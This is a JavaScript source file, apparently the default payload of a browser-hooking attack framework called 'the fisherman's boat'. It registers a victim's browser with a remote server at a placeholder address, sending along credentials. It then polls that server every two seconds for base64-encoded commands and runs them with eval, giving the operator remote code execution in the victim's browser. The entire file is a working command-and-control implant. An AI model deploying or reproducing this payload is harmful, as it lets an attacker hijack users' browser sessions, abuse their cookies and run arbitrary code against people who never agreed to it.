/*
Default payload for hooking browsers to the fisherman's boat using fetch api
This payload if for non-persistent scripts that after eval'd can be thrown away
*/


(async function() {
    var serverAddress = "<server_address>";
    var connectionRetryCount = 0;

    async function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }

    async function startSession(serverAddress) {
        for (let nConnectionAttemps = 0; nConnectionAttemps < 4; nConnectionAttemps++) {
            console.log("Hooking to server... ");
            try {
                const res = await fetch(`http://${serverAddress}/hook/`, {
                    method: "GET",
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    credentials: "include"
                });

                if (!res.ok) {
                    throw new Error(`HTTP error! status: ${res.status}`);
                }

                return true;
    
            } 
            catch (error) {
                console.error(`Error hooking to server: ${error}, number of connection attempts: ${nConnectionAttemps}... `);
            }

            await sleep(2000);
        }
        
        return false;
    }

    async function sendRequest(serverAddress) {
        console.log("Fetching command from server...");
        try {
            const res = await fetch(`http://${serverAddress}/command/`, {
                method: "GET",
                mode: 'cors', 
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: "include"
            });

            if (!res.ok) {
                throw new Error(`HTTP error! status: ${res.status}`);
            }

            let data = await res.json();
            if (!data.command) {
                console.log("No command to execute... ");
            }

            else {
                eval(atob(data.command));
            }

            return true;

        } catch (error) {
            connectionRetryCount++;
            console.error(`Error fetching command from server: ${error}, number of connection attempts: ${connectionRetryCount}... `);
            if (connectionRetryCount > 3) {
                return false;
            }

            return true;
        }
    }

    const sessionStartStatus = await startSession(serverAddress);

    if (!sessionStartStatus) {
        throw new Error("Stopping execution due to connection problems... ");
    }

    const intervalId = setInterval(() => { 
        const status = sendRequest(serverAddress);
        if (!status) {
            clearInterval(intervalId);
            throw new Error("Stopping execution due to connection problems... ");
        }

    }, 2000);
})();